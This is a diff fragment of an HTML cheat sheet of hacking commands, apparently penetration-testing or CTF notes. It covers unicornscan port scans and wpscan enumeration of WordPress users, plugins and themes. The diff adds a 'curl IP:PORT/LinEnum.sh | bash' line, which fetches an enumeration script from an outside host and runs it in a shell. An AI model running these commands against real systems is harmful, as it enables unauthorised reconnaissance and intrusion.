@@ -22,10 +22,16 @@ usefull tips and tools for hacking
   <li> unicornscan -r300 -mU 'IP' - UDP scan. USE -mT for TCP
 </ul>
 
+<b>IpSec</b>
+<ul>
+  <li> python -m SimpleHTTPServer PORT
+  <li> curl IP:PORT/LinEnum.sh | bash
+</ul>
+
+
 <b>WPscan</b>
 <ul>
   <li> wpscan -u <URL> -eu -ep -et
-  <li> 
 </ul>
     
 <b>Shell</b>
